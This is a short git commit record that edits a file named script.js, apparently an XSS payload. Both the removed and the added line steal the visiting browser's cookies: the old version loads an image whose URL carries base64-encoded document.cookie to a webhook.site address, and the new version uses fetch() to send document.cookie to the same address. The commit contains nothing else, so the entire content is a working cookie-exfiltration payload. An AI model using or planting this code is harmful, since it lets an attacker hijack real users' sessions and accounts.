b85e6757537a7cc574ceb8d6a052bdd0f0c98781
fexsecc <165517769+fexsecc@users.noreply.github.com>
2024-10-06 07:34:55 +0000

    Update script.js

--- script.js
+++ script.js
@@ -1,2 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/ca4cef33-9efd-4271-bf08-9d0c36467f4f?
-data='+btoa(document.cookie);
+fetch('https://webhook.site/ca4cef33-9efd-4271-bf08-9d0c36467f4f?data=' + document.cookie)
